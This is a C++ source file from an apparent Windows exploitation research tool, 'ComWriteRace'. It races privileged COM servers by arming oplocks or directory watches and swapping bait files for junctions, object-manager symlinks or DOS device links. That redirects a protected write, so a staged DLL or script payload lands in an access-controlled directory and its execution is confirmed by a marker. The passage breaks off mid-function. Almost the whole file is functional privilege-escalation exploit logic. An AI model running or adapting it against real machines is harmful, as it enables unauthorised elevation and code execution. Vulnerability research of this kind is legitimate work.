#include "comrace/runner.hpp"

#include "comrace/json.hpp"
#include "comrace/json_output.hpp"
#include "platform/windows/broker.hpp"
#include "platform/windows/cfapi_bait.hpp"
#include "platform/windows/com_invoker.hpp"
#include "platform/windows/dos_symlink.hpp"
#include "platform/windows/junction.hpp"
#include "platform/windows/om_symlink.hpp"
#include "platform/windows/oplock.hpp"
#include "platform/windows/race_sensor.hpp"
#include "platform/windows/win_utils.hpp"

#include <algorithm>
#include <chrono>
#include <cctype>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

namespace comrace {
namespace {

bool is_payload_mode(RunMode mode) {
  return mode == RunMode::Write || mode == RunMode::ExecDll ||
         mode == RunMode::ExecScript;
}

bool is_execution_mode(RunMode mode) {
  return mode == RunMode::ExecDll || mode == RunMode::ExecScript;
}

void reset_safe_directory(const ResolvedRun& run) {
  win::remove_junction_if_exists(run.safeDirectory);
  win::delete_file_if_exists(run.baitPath);
  if (win::directory_exists(run.safeDirectory)) {
    if (!win::remove_directory_if_exists(run.safeDirectory)) {
      throw std::runtime_error(
          "safe directory is not empty; refusing to clean recursively: " + run.safeDirectory);
    }
  }
  win::ensure_directory_tree(run.safeDirectory);
}

void reset_safe_directory_om(const ResolvedRun& run) {
  win::remove_junction_if_exists(run.safeDirectory);
  if (win::directory_exists(run.safeDirectory)) {
    if (!win::remove_directory_if_exists(run.safeDirectory)) {
      throw std::runtime_error(
          "safe directory is not empty; refusing to clean recursively: " + run.safeDirectory);
    }
  }
  win::create_junction_to_nt(run.safeDirectory, "\\RPC Control");
}

bool target_materialized(const ResolvedRun& run) {
  return win::file_exists(run.targetPath);
}

std::string cleanup_workspace_link(const ResolvedRun& run) {
  try {
    win::remove_junction_if_exists(run.safeDirectory);
    return {};
  } catch (const std::exception& ex) {
    return "failed to remove workspace junction " + run.safeDirectory + ": " + ex.what();
  } catch (...) {
    return "failed to remove workspace junction " + run.safeDirectory + ": unknown error";
  }
}

class WorkspaceLinkCleanup {
 public:
  explicit WorkspaceLinkCleanup(const ResolvedRun& run) : run_(run) {}
  ~WorkspaceLinkCleanup() {
    if (!active_) {
      return;
    }
    const std::string warning = cleanup_workspace_link(run_);
    if (!warning.empty()) {
      std::cerr << "[!] cleanup warning: " << warning << "\n";
    }
  }

  WorkspaceLinkCleanup(const WorkspaceLinkCleanup&) = delete;
  WorkspaceLinkCleanup& operator=(const WorkspaceLinkCleanup&) = delete;

  std::string cleanup_now() {
    if (!active_) {
      return {};
    }
    active_ = false;
    return cleanup_workspace_link(run_);
  }

 private:
  const ResolvedRun& run_;
  bool active_ = true;
};

class StagedFileCleanup {
 public:
  ~StagedFileCleanup() {
    if (path_.empty()) {
      return;
    }
    try {
      win::delete_file_if_exists(path_);
    } catch (const std::exception& ex) {
      std::cerr << "[!] cleanup warning: failed to remove staged payload "
                << path_ << ": " << ex.what() << "\n";
    }
  }

  void reset(std::string path) { path_ = std::move(path); }

 private:
  std::string path_;
};

class SessionJournal {
 public:
  SessionJournal(const ResolvedRun& run, const std::string& nonce) {
    safeDirectory_ = run.safeDirectory;
    const std::string separator =
        !run.workspace.empty() &&
                (run.workspace.back() == '\\' || run.workspace.back() == '/')
            ? ""
            : "\\";
    path_ = run.workspace + separator + ".cwr-active-session";
    if (win::file_exists(path_)) {

      win::remove_junction_if_exists(run.safeDirectory);
      win::delete_file_if_exists(path_);
      recovered_ = true;
    }
    std::ostringstream record;
    record << "schema=cwr.session.v1\n"
           << "nonce=" << nonce << "\n"
           << "workspace=" << run.workspace << "\n"
           << "safe_directory=" << run.safeDirectory << "\n";
    win::write_text_file(path_, record.str());
  }

  ~SessionJournal() {
    if (path_.empty()) return;
    try {

      if (win::is_reparse_point(safeDirectory_)) {
        std::cerr << "[!] cleanup warning: preserving session journal because "
                  << safeDirectory_ << " is still a reparse point\n";
        return;
      }
      win::delete_file_if_exists(path_);
    } catch (const std::exception& ex) {
      std::cerr << "[!] cleanup warning: failed to remove session journal "
                << path_ << ": " << ex.what() << "\n";
    }
  }

  bool recovered() const { return recovered_; }

 private:
  std::string path_;
  std::string safeDirectory_;
  bool recovered_ = false;
};

std::string describe_broker_failure(const win::BrokerOutcome& outcome) {
  std::string detail = outcome.status.empty() ? "unknown" : outcome.status;
  if (!outcome.hresult.empty()) {
    detail += " " + outcome.hresult;
  }
  if (!outcome.message.empty()) {
    detail += " - " + outcome.message;
  }
  return detail;
}

ServerCompletion server_completion_from(const win::BrokerOutcome& outcome) {
  if (outcome.timedOut) {
    return ServerCompletion::UnknownClientKilled;
  }
  if (outcome.status == "success") {
    return ServerCompletion::Returned;
  }

  return ServerCompletion::UnknownClientExited;
}

RunResult finish_with_cleanup(RunResult result, WorkspaceLinkCleanup& cleanup) {
  const std::string warning = cleanup.cleanup_now();
  result.cleanupStatus = warning.empty() ? "workspace_link_removed" : "warning";
  if (!warning.empty()) {
    if (!result.message.empty()) {
      result.message += "; ";
    }
    result.message += "cleanup_warning=" + warning;
  }
  return result;
}

struct SwapOutcome {
  bool ok = false;
  int retries = 0;
  long long baitGoneTick = 0;
  long long reparseSetTick = 0;
  std::string stage = "not_started";
  std::string error = "none";
};

SwapOutcome active_swap(
    const ResolvedRun& run,
    const win::PreparedReparse& prepared,
    HANDLE pinnedSafeDirectory,
    unsigned windowMs) {
  SwapOutcome result;
  const auto deadline =
      std::chrono::steady_clock::now() + std::chrono::milliseconds(windowMs);

  for (;;) {
    result.stage = "delete_bait";
    const DWORD del = win::try_delete_file(run.baitPath);
    if (del != ERROR_SUCCESS &&
        del != ERROR_SHARING_VIOLATION &&
        del != ERROR_ACCESS_DENIED) {
      result.error = "delete bait failed: " + win::last_error_message(del);
      return result;
    }

    if (del == ERROR_SUCCESS && !win::path_exists(run.baitPath)) {
      result.baitGoneTick = win::qpc_now();
      result.stage = "set_reparse_point";
      try {

        win::set_mount_point_handle(pinnedSafeDirectory, prepared);
        result.reparseSetTick = win::qpc_now();
        result.stage = "complete";
        result.ok = true;
        return result;
      } catch (const std::exception& ex) {

        result.error = ex.what();
      }
    }

    if (std::chrono::steady_clock::now() >= deadline) {
      if (result.error == "none") {
        result.error = "bait did not become deletable within the swap window";
      }
      return result;
    }
    ++result.retries;

    if (result.retries < 64) {
      YieldProcessor();
    } else if (result.retries < 256) {
      SwitchToThread();
    } else {
      std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
  }
}

SwapOutcome active_swap_om(
    const ResolvedRun& run,
    win::OmSymlink& symlink,
    const std::string& ntTargetPath,
    unsigned windowMs) {
  SwapOutcome result;
  const auto deadline =
      std::chrono::steady_clock::now() + std::chrono::milliseconds(windowMs);

  for (;;) {
    result.stage = "release_om_symlink";
    symlink.handle.reset();
    result.baitGoneTick = win::qpc_now();
    result.stage = "create_om_symlink";
    try {
      symlink = win::create_om_symlink(run.targetFileName, ntTargetPath);
    } catch (const std::exception& ex) {
      result.error = ex.what();
    }
    if (symlink.handle) {
      result.reparseSetTick = win::qpc_now();
      result.stage = "complete";
      result.ok = true;
      return result;
    }

    if (std::chrono::steady_clock::now() >= deadline) {
      if (result.error == "none") {
        result.error = "object symlink name could not be repointed within the swap window";
      }
      return result;
    }
    ++result.retries;
    if (result.retries < 64) {
      YieldProcessor();
    } else if (result.retries < 256) {
      SwitchToThread();
    } else {
      std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
  }
}

SwapOutcome active_swap_dos(
    const std::string& deviceName,
    const std::string& oldNtTarget,
    const std::string& newNtTarget,
    unsigned windowMs) {
  SwapOutcome result;
  const auto deadline =
      std::chrono::steady_clock::now() + std::chrono::milliseconds(windowMs);

  for (;;) {
    result.stage = "remove_dos_device";
    (void)win::remove_dos_device_exact(deviceName, oldNtTarget);
    if (!win::dos_device_exists(deviceName)) {
      result.baitGoneTick = win::qpc_now();
      result.stage = "create_dos_device";
      try {
        win::set_dos_device(deviceName, newNtTarget);
      } catch (const std::exception& ex) {
        result.error = ex.what();
      }
      if (result.error == "none" && win::dos_device_exists(deviceName)) {
        result.reparseSetTick = win::qpc_now();
        result.stage = "complete";
        result.ok = true;
        return result;
      }
    }

    if (std::chrono::steady_clock::now() >= deadline) {
      if (result.error == "none") {
        result.error = "dos device could not be repointed within the swap window";
      }
      return result;
    }
    ++result.retries;
    if (result.retries < 64) {
      YieldProcessor();
    } else if (result.retries < 256) {
      SwitchToThread();
    } else {
      std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
  }
}

struct CloudBaitCleanup {
  std::string directory;

  ~CloudBaitCleanup() {
    if (directory.empty()) {
      return;
    }
    try {
      win::teardown_cloud_bait(directory);
    } catch (...) {
    }
  }
};

struct DecoyCleanup {
  std::string path;
  std::string directory;

  ~DecoyCleanup() {
    if (path.empty()) {
      return;
    }
    win::delete_file_if_exists(path);
    win::remove_directory_if_exists(directory);
  }
};

struct DosDeviceCleanup {
  std::string deviceName;

  ~DosDeviceCleanup() {
    if (deviceName.empty()) {
      return;
    }
    try {
      (void)win::remove_dos_device(deviceName);
    } catch (...) {
    }
  }
};

std::string bool_text(bool value) {
  return value ? "true" : "false";
}

struct MarkerVerification {
  bool exists = false;
  bool contentMatches = false;
};

MarkerVerification wait_for_execution_marker(
    const ExecutionStrategy& strategy,
    const std::string& markerPath) {
  MarkerVerification result;
  const auto deadline =
      std::chrono::steady_clock::now() +
      std::chrono::milliseconds(
          static_cast<long long>(strategy.markerTimeoutMs));

  while (true) {
    result.exists = win::file_exists(markerPath);
    if (result.exists &&
        win::file_contains_text_case_insensitive(
            markerPath,
            strategy.markerContains)) {
      result.contentMatches = true;
      return result;
    }

    if (std::chrono::steady_clock::now() >= deadline) {
      return result;
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
  }
}

std::string lower_ascii(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::tolower(c));
  });
  return value;
}

bool is_path_inside(const std::string& child, const std::string& parent) {
  if (child.size() <= parent.size()) {
    return false;
  }
  if (child.compare(0, parent.size(), parent) != 0) {
    return false;
  }
  return child[parent.size()] == '\\';
}

bool valid_decimal_pid(const std::string& value) {
  return !value.empty() && value != "0" &&
         std::all_of(value.begin(), value.end(), [](unsigned char c) {
           return std::isdigit(c) != 0;
         });
}

bool valid_execution_marker(
    const win::ExecutionMarker& marker,
    const std::string& expectedModulePath,
    const std::string& expectedNonce) {
  if (!marker.markerHeaderPresent || !valid_decimal_pid(marker.pid) ||
      marker.processImage.empty() || marker.modulePath.empty() ||
      marker.sid.rfind("S-1-", 0) != 0 || marker.integrity.empty() ||
      marker.experimentNonce != expectedNonce) {
    return false;
  }
  if (marker.impersonating &&
      (marker.threadSid.rfind("S-1-", 0) != 0 ||
       marker.threadIntegrity.empty())) {
    return false;
  }
  try {
    return lower_ascii(win::full_path_name(marker.modulePath)) ==
           lower_ascii(win::full_path_name(expectedModulePath));
  } catch (...) {
    return false;
  }
}

void validate_windows_path_separation(const ResolvedRun& run, bool allowPathOverlap) {
  if (allowPathOverlap || run.targetDirectory.empty() || run.targetDirectory == ".") {
    return;
  }

  const std::string workspace = lower_ascii(win::full_path_name(run.workspace));
  const std::string targetDirectory = lower_ascii(win::full_path_name(run.targetDirectory));

  if (workspace == targetDirectory) {
    throw std::runtime_error("workspace equals target directory after Windows path canonicalization");
  }
  if (is_path_inside(targetDirectory, workspace)) {
    throw std::runtime_error("target directory is inside workspace after Windows path canonicalization");
  }
  if (is_path_inside(workspace, targetDirectory)) {
    throw std::runtime_error("workspace is inside target directory after Windows path canonicalization");
  }

  win::ensure_directory_tree(run.workspace);
  const win::PathIdentity wsId = win::path_identity(run.workspace);
  const win::PathIdentity tgtId = win::path_identity(run.targetDirectory);
  if (wsId.ok && tgtId.ok &&
      wsId.volumeSerial == tgtId.volumeSerial && wsId.fileId == tgtId.fileId) {
    throw std::runtime_error(
        "workspace and target directory resolve to the same filesystem object "
        "(volume " + std::to_string(wsId.volumeSerial) + " id " + wsId.fileId + ")");
  }

  std::string firstReparse;
  if (win::has_reparse_component(run.workspace, firstReparse)) {
    throw std::runtime_error(
        "workspace path has a reparse point at/above " + firstReparse +
        "; refusing to race through an aliased tree (pre-existing reparse components cannot be overridden)");
  }
  if (win::has_reparse_component(run.targetDirectory, firstReparse)) {
    throw std::runtime_error(
        "target directory path has a reparse point at/above " + firstReparse +
        "; refusing to write through an aliased tree (pre-existing reparse components cannot be overridden)");
  }
}

void validate_windows_reopen_paths(const ResolvedRun& run) {
  const std::string workspace =
      lower_ascii(win::full_path_name(run.workspace));
  const std::string targetDirectory =
      lower_ascii(win::full_path_name(run.targetDirectory));
  const std::string safeDirectory =
      lower_ascii(win::full_path_name(run.safeDirectory));
  if (!is_path_inside(targetDirectory, workspace)) {
    throw std::runtime_error(
        "check destination escaped the workspace after Windows path canonicalization");
  }
  if (targetDirectory == safeDirectory ||
      is_path_inside(targetDirectory, safeDirectory) ||
      is_path_inside(safeDirectory, targetDirectory)) {
    throw std::runtime_error(
        "check destination and bait directories overlap after Windows path canonicalization");
  }
  std::string firstReparse;
  if (win::has_reparse_component(run.workspace, firstReparse)) {
    throw std::runtime_error(
        "check workspace has a pre-existing reparse point at/above " +
        firstReparse);
  }
  if (win::has_reparse_component(run.targetDirectory, firstReparse)) {
    throw std::runtime_error(
        "check destination has a pre-existing reparse point at/above " +
        firstReparse);
  }
}

}

RunResult probe_platform(const RunConfig& config) {
  const std::string hostExe =
      win::resolve_host_executable(config.hostArch, config.target);
  win::BrokerSession session(
      hostExe,
      config.workspace,
      win::BrokerOperation::Probe,
      config.target,
      {});
  if (!session.started()) {
    return RunResult{false, 0, "invocation host: " + session.startError()};
  }
  const win::BrokerOutcome outcome = session.wait(30000);
  if (outcome.status == "success") {
    return RunResult{
        true, 0,
        "target probe succeeded via " + config.target.invoker + ": " +
            config.target.method + " (isolated host)"};
  }
  return RunResult{false, 0, "target probe failed: " + describe_broker_failure(outcome)};
}

std::string probe_activation_platform(const RunConfig& config) {
  const auto probeOne = [&](const std::string& arch) {
    const std::string hostExe =
        win::resolve_host_executable(arch, config.target);
    if (config.verbose) {
      std::cerr << "[*] activation broker host: " << hostExe << "\n";
    }
    if (!win::file_exists(hostExe)) {
      return std::string("host_missing");
    }
    if (config.verbose) {
      std::cerr << "[*] activation broker create\n";
    }
    win::BrokerSession session(
        hostExe, config.workspace, win::BrokerOperation::ActivationProbe,
        config.target, {});
    if (!session.started()) {
      return std::string("host_error: ") + session.startError();
    }
    if (config.verbose) {
      std::cerr << "[*] activation broker wait\n";
    }
    const unsigned budget = config.invokeTimeoutMs > 0
                                ? static_cast<unsigned>(config.invokeTimeoutMs)
                                : 15000u;
    const win::BrokerOutcome outcome = session.wait(budget);
    if (config.verbose) {
      std::cerr << "[*] activation broker result: status=" << outcome.status
                << " exit=" << outcome.exitCode
                << " bytes=" << outcome.rawResult.size() << "\n";
    }
    if (outcome.timedOut) {
      return std::string("timeout");
    }
    if (outcome.status != "success" || outcome.rawResult.empty()) {
      return outcome.status.empty() ? std::string("unknown") : outcome.status;
    }
    try {
      const comrace::json::Value root = comrace::json::parse(outcome.rawResult);
      const comrace::json::Value* ap = root.find("activation_probe");
      if (ap == nullptr || !ap->is_object()) {
        return std::string("no_result");
      }
      const comrace::json::Value* local = ap->find("local_server");
      const comrace::json::Value* disp = ap->find("idispatch");
      const bool localOk = local && local->is_bool() && local->as_bool();
      const bool dispOk = disp && disp->is_bool() && disp->as_bool();
      if (!localOk) {
        const comrace::json::Value* hr = ap->find("local_server_hresult");
        return "denied " + ((hr && hr->is_string())
                                ? hr->as_string() : std::string("?"));
      }
      if (!dispOk) return std::string("local_server");
      if (!config.target.method.empty()) {
        const comrace::json::Value* method = ap->find("method_available");
        if (method == nullptr || !method->is_bool() || !method->as_bool()) {
          const comrace::json::Value* hr = ap->find("method_hresult");
          return "method_missing " + ((hr && hr->is_string())
                                          ? hr->as_string()
                                          : std::string("?"));
        }
        return std::string("local_server+idispatch+method");
      }
      return std::string("local_server+idispatch");
    } catch (const std::exception&) {
      return std::string("bad_result");
    }
  };

  if (!config.hostArch.empty() && config.hostArch != "auto") {
    return probeOne(config.hostArch);
  }
  const std::string x64 = probeOne("x64");
  const std::string x86 = probeOne("x86");
  const bool hasDispatch =
      x64.rfind("local_server+idispatch", 0) == 0 ||
      x86.rfind("local_server+idispatch", 0) == 0;
  const bool hasLocal = hasDispatch ||
      x64.rfind("local_server", 0) == 0 ||
      x86.rfind("local_server", 0) == 0;
  std::ostringstream result;
  result << (hasDispatch ? "local_server+idispatch"
                         : hasLocal ? "local_server" : "not_activatable")
         << " [x64=" << x64 << ";x86=" << x86 << "]";
  return result.str();
}

std::string inspect_platform(const RunConfig& config) {
  struct HostInspection {
    std::string arch;
    std::string status;
    std::string raw;
  };
  const auto inspectOne = [&](const std::string& arch) {
    HostInspection result;
    result.arch = arch;
    const std::string hostExe =
        win::resolve_host_executable(arch, config.target);
    if (!win::file_exists(hostExe)) {
      result.status = "host_missing";
      return result;
    }
    win::BrokerSession session(
        hostExe, config.workspace, win::BrokerOperation::Inspect,
        config.target, {});
    if (!session.started()) {
      result.status = "host_error: " + session.startError();
      return result;
    }
    const unsigned budget = config.invokeTimeoutMs > 0
                                ? static_cast<unsigned>(config.invokeTimeoutMs)
                                : 30000u;
    const win::BrokerOutcome outcome = session.wait(budget);
    result.status = outcome.timedOut
                        ? "timeout"
                        : outcome.status.empty() ? "unknown" : outcome.status;
    if (outcome.status == "success") {
      result.raw = outcome.rawResult;
    } else if (!outcome.timedOut) {
      result.status = describe_broker_failure(outcome);
    }
    return result;
  };

  std::vector<HostInspection> hosts;
  if (!config.hostArch.empty() && config.hostArch != "auto") {
    hosts.push_back(inspectOne(config.hostArch));
  } else {
    hosts.push_back(inspectOne("x64"));
    hosts.push_back(inspectOne("x86"));
  }
  bool anySuccess = false;
  std::ostringstream out;
  out << "{\"inspection_context\":\"local_server_only\",\"hosts\":[";
  for (std::size_t i = 0; i < hosts.size(); ++i) {
    const HostInspection& host = hosts[i];
    anySuccess = anySuccess || !host.raw.empty();
    if (i != 0) out << ',';
    out << "{\"arch\":";
    json_output::write_string(out, host.arch);
    out << ",\"status\":";
    json_output::write_string(out, host.status);
    out << ",\"result\":" << (host.raw.empty() ? "null" : host.raw) << '}';
  }
  out << "]}";
  if (!anySuccess) {
    throw std::runtime_error("inspect failed in every available host: " + out.str());
  }
  return out.str();
}

RunResult observe_platform(const RunConfig& config) {
  try {
    const ResolvedRun run = resolve_run(config);
    win::ensure_directory_tree(run.workspace);
    reset_safe_directory(run);
    if (config.prepareObservationBait) {
      win::write_text_file(run.baitPath, run.content);
    }
    const std::string hostExe =
        win::resolve_host_executable(config.hostArch, config.target);
    win::BrokerSession session(
        hostExe, run.workspace, win::BrokerOperation::Invoke,
        config.target, run.arguments);
    if (!session.started()) {
      return RunResult{false, 1, "invocation host: " + session.startError()};
    }
    const win::BrokerOutcome outcome = session.wait(
        config.invokeTimeoutMs > 0
            ? static_cast<unsigned>(config.invokeTimeoutMs)
            : static_cast<unsigned>(config.oplockTimeoutMs) + 30000u);
    if (outcome.status != "success") {
      return RunResult{false, 1,
                       "observation invocation failed: " + describe_broker_failure(outcome)};
    }
    return RunResult{
        true,
        1,
        "targeted method invoked once (isolated host) without race manipulation; "
        "export the capture as CSV and analyze it"};
  } catch (const std::exception& ex) {
    return RunResult{
        false,
        1,
        std::string("observation invocation failed: ") + ex.what()};
  }
}

RunResult run_platform(const RunConfig& config) {
  ResolvedRun run = resolve_run(config);
  const std::string experimentNonce = win::new_guid_token();
  if (experimentNonce.empty()) {
    return RunResult{false, 0, "could not generate a per-run experiment nonce"};
  }
  if (!is_payload_mode(config.mode)) {
    run.content +=
        "\r\nComWriteRace experiment nonce=" + experimentNonce;
    for (ResolvedArgument& argument : run.arguments) {
      if (argument.sourceKind == ArgumentSourceKind::Content) {
        argument.value = run.content;
      }
    }
  }

  win::ensure_directory_tree(run.workspace);
  if (config.mode == RunMode::CheckReopen) {
    win::ensure_directory_tree(run.targetDirectory);
  } else if (!win::directory_exists(run.targetDirectory)) {
    return RunResult{
        false, 0,
        "target directory does not exist: " + run.targetDirectory};
  }
  if (config.mode == RunMode::CheckReopen) {
    validate_windows_reopen_paths(run);
  } else {
    validate_windows_path_separation(run, config.allowPathOverlap);
  }

  SessionJournal journal(run, experimentNonce);
  if (journal.recovered() && config.verbose) {
    std::cout << "[*] recovered a stale CWR workspace junction from a prior "
                 "interrupted session\n";
  }

  win::PinnedDirectoryTree workspacePin;
  win::PinnedDirectoryTree targetPin;
  try {
    workspacePin = win::PinnedDirectoryTree(run.workspace, false);
    targetPin = win::PinnedDirectoryTree(run.targetDirectory, false);
  } catch (const std::exception& ex) {
    return RunResult{
        false, 0,
        std::string("could not establish stable namespace pins: ") + ex.what()};
  }
  if (!workspacePin.verify() || !targetPin.verify()) {
    return RunResult{false, 0, "workspace/target namespace pins failed verification"};
  }
  if (!config.allowPathOverlap) {
    const win::PathIdentity& workspaceIdentity = workspacePin.leaf_identity();
    const win::PathIdentity& targetIdentity = targetPin.leaf_identity();
    if (workspaceIdentity.ok && targetIdentity.ok &&
        workspaceIdentity.volumeSerial == targetIdentity.volumeSerial &&
        workspaceIdentity.fileId == targetIdentity.fileId) {
      return RunResult{
          false, 0,
          "workspace and target became the same pinned filesystem object"};
    }
  }
  WorkspaceLinkCleanup cleanup(run);
  StagedFileCleanup stagedPayloadCleanup;
  std::string artifactSourceSha256;
  std::string artifactStagedSha256;
  unsigned long long artifactSourceSize = 0;
  unsigned long long artifactStagedSize = 0;
  bool artifactExactCopy = false;

  if (is_payload_mode(config.mode) && !win::file_exists(run.payloadPath)) {
    return finish_with_cleanup(
        RunResult{false, 0, "payload file does not exist: " + run.payloadPath},
        cleanup);
  }
  if (is_payload_mode(config.mode)) {
    win::ensure_directory_tree(run.workspace);
    const std::string originalPayloadPath = run.payloadPath;
    const std::string separator =
        !run.workspace.empty() &&
                (run.workspace.back() == '\\' || run.workspace.back() == '/')
            ? ""
            : "\\";
    std::string artifactExtension =
        std::filesystem::u8path(originalPayloadPath).extension().u8string();
    if (artifactExtension.empty()) {
      artifactExtension = ".payload";
    }
    const std::string stagedPayloadPath =
        run.workspace + separator + ".cwr-artifact-" +
        experimentNonce + artifactExtension;
    try {
      artifactSourceSha256 = win::sha256_file(originalPayloadPath);
      artifactSourceSize = win::file_size_bytes(originalPayloadPath);
      if (config.target.execution.developmentNonceOverlay) {
        win::copy_file_with_nonce_overlay(
            originalPayloadPath, stagedPayloadPath, experimentNonce);
      } else {
        win::copy_file_exact(originalPayloadPath, stagedPayloadPath);
      }
      artifactStagedSha256 = win::sha256_file(stagedPayloadPath);
      artifactStagedSize = win::file_size_bytes(stagedPayloadPath);
      artifactExactCopy =
          artifactSourceSize == artifactStagedSize &&
          artifactSourceSha256 == artifactStagedSha256;
      if (!config.target.execution.developmentNonceOverlay && !artifactExactCopy) {
        throw std::runtime_error(
            "exact artifact staging verification failed (SHA-256 or size mismatch)");
      }
    } catch (const std::exception& ex) {
      return finish_with_cleanup(
          RunResult{
              false, 0,
              std::string("could not stage payload artifact: ") +
                  ex.what()},
          cleanup);
    }
    stagedPayloadCleanup.reset(stagedPayloadPath);
    for (ResolvedArgument& argument : run.arguments) {
      if (argument.sourceKind == ArgumentSourceKind::PayloadPath) {
        argument.value = stagedPayloadPath;
      }
    }
    run.payloadPath = stagedPayloadPath;
  }
  if (is_execution_mode(config.mode) &&
      config.target.execution.markerRequired &&
      win::path_exists(run.markerPath)) {
    return finish_with_cleanup(
        RunResult{
            false,
            0,
            "required execution marker already exists; remove it before collecting a fresh result: " +
                run.markerPath},
        cleanup);
  }

  AccessTest markerAccess = AccessTest::NotTested;
  if (is_execution_mode(config.mode) &&
      config.target.execution.markerRequired) {
    const win::TargetPrecheck markerPrecheck =
        win::precheck_target(run.markerPath, run.markerDirectory);
    markerAccess =
        !markerPrecheck.directoryWriteProbeConclusive
            ? AccessTest::Inconclusive
            : markerPrecheck.directoryWritable ? AccessTest::Allowed
                                                : AccessTest::Denied;
  }

  const win::TargetPrecheck precheck =
      win::precheck_target(run.targetPath, run.targetDirectory);
  if (precheck.targetExists) {
    return finish_with_cleanup(RunResult{false, 0, precheck.detail}, cleanup);
  }
  if (!precheck.directoryExists) {
    return finish_with_cleanup(RunResult{false, 0, precheck.detail}, cleanup);
  }
  if (!precheck.directoryWriteProbeConclusive) {
    const std::string resultKind =
        config.mode == RunMode::CheckReopen
            ? "controlled re-resolution result"
            : "protected-target result";
    return finish_with_cleanup(
        RunResult{false, 0, precheck.detail + "; refusing to claim a " + resultKind},
        cleanup);
  }
  if (config.mode == RunMode::CheckReopen && !precheck.directoryWritable) {
    return finish_with_cleanup(
        RunResult{
            false,
            0,
            precheck.detail +
                "; check requires an attacker-writable derived destination directory"},
        cleanup);
  }
  if (config.mode != RunMode::CheckReopen &&
      precheck.directoryWritable &&
      !config.allowWritableTarget) {
    return finish_with_cleanup(
        RunResult{
            false,
            0,
            precheck.detail + "; choose an access-controlled test directory or pass --allow-writable-target"},
        cleanup);
  }

  const AccessTest callerAccess =
      !precheck.directoryWriteProbeConclusive ? AccessTest::Inconclusive
      : precheck.directoryWritable ? AccessTest::Allowed
                                   : AccessTest::Denied;

  const bool omSwap =
      config.target.swapPrimitive == SwapPrimitive::ObjectManagerSymlink;
  const std::string decoyDirectory =
      omSwap ? run.workspace + "\\decoy" : std::string();
  const std::string decoyPath =
      omSwap ? decoyDirectory + "\\" + run.targetFileName : std::string();
  const std::string omDecoyTarget = omSwap
      ? "\\??\\" + win::full_path_name(decoyPath)
      : std::string();
  const std::string omFinalTarget = omSwap
      ? "\\??\\" + win::full_path_name(run.targetPath)
      : std::string();
  const bool dosSwap =
      config.target.swapPrimitive == SwapPrimitive::DosDeviceSymlink;
  const std::string dosPrepTarget = dosSwap
      ? "\\??\\" + win::full_path_name(run.safeDirectory)
      : std::string();
  const std::string dosFinalTarget = dosSwap
      ? "\\??\\" + win::full_path_name(run.targetDirectory)
      : std::string();

  const win::PreparedReparse preparedReparse =
      (omSwap || dosSwap)
          ? win::PreparedReparse{}
          : win::prepare_mount_point(run.targetDirectory);

  DosDeviceCleanup dosCleanup;
  if (dosSwap) {
    dosCleanup.deviceName = run.dosDeviceName;
  }

  const unsigned swapWindowMs =
      config.swapWindowMs > 0
          ? static_cast<unsigned>(config.swapWindowMs)
          : (std::min)(static_cast<unsigned>(config.oplockTimeoutMs), 5000u);
  const std::string hostExe =
      win::resolve_host_executable(config.hostArch, config.target);
  const win::TriggerKind triggerKind =
      config.target.raceTrigger == RaceTrigger::DirectoryWatch
          ? win::TriggerKind::DirectoryWatch
          : config.target.raceTrigger == RaceTrigger::WnfState
                ? win::TriggerKind::Wnf
                : win::TriggerKind::FileOplock;

  std::string lastError;
  bool anyTriggerObserved = false;
  bool anyRedirectInstalled = false;
  ServerCompletion lastServerCompletion = ServerCompletion::NotStarted;
  for (int attempt = 1; attempt <= config.attempts; ++attempt) {
    bool oplockBreak = false;
    bool targetExists = false;
    bool contentMatch = false;
    std::string swapError = "none";
    std::string swapStage = "not_started";
    std::string comCallResult = "success";
    const int attemptSwapStartOffsetUs =
        swap_start_offset_for_attempt(config, attempt);
    long long breakTick = 0, releaseTick = 0, targetSeenTick = 0;
    long long invokeStartTick = 0, invokeReturnTick = 0;
    SwapOutcome swap;

    win::OmSymlink decoySymlink;
    DecoyCleanup decoyCleanup;
    CloudBaitCleanup cloudCleanup;
    if (omSwap) {
      decoyCleanup.path = decoyPath;
      decoyCleanup.directory = decoyDirectory;
      reset_safe_directory_om(run);
      win::ensure_directory_tree(decoyDirectory);
      decoySymlink = win::create_om_symlink(run.targetFileName, omDecoyTarget);
      win::write_text_file(run.baitPath, run.content);
    } else if (dosSwap) {
      reset_safe_directory(run);
      if (config.target.baitPrecreated) {
        win::write_text_file(run.baitPath, run.content);
      }
      win::remove_dos_device(run.dosDeviceName);
      win::set_dos_device(run.dosDeviceName, dosPrepTarget);
    } else {
      reset_safe_directory(run);
      if (config.target.baitPrecreated) {
        if (config.target.baitKind == BaitKind::CloudPlaceholder) {
          cloudCleanup.directory = run.safeDirectory;
          win::prepare_cloud_placeholder_bait(
              run.safeDirectory, run.targetFileName, experimentNonce);
        } else {
          win::write_text_file(run.baitPath, run.content);
        }
      }
    }

    win::PinnedDirectoryTree safePin(run.safeDirectory, true);
    const auto finishPinnedAttempt = [&](RunResult result) {
      safePin.reset();
      return finish_with_cleanup(std::move(result), cleanup);
    };
    if (!workspacePin.verify() || !targetPin.verify() ||
        !safePin.verify(omSwap)) {
      return finishPinnedAttempt(RunResult{
          false, attempt,
          "namespace pin verification failed before invocation"});
    }

    win::RaceSensor sensor(
        triggerKind, run.baitPath, run.safeDirectory,
        config.target.triggerWnfState);
    try {
      sensor.arm();
    } catch (const std::exception& ex) {
      lastError = std::string("could not arm the race trigger: ") + ex.what();
      if (config.verbose) {
        std::cout << "[*] attempt=" << attempt << " arm_failed=\"" << ex.what()
                  << "\"\n";
      }
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }

    win::BrokerSession session(
        hostExe, run.workspace, win::BrokerOperation::Invoke,
        config.target, run.arguments);
    if (!session.started()) {
      sensor.release();
      return finishPinnedAttempt(
          RunResult{false, 0, "invocation host: " + session.startError()});
    }
    invokeStartTick = session.startTick();

    oplockBreak = sensor.wait_for_signal(static_cast<unsigned>(config.oplockTimeoutMs));
    if (oplockBreak) {
      breakTick = win::qpc_now();

      swapStage = "release_sensor";
      sensor.release();
      releaseTick = win::qpc_now();
      if (attemptSwapStartOffsetUs > 0) {

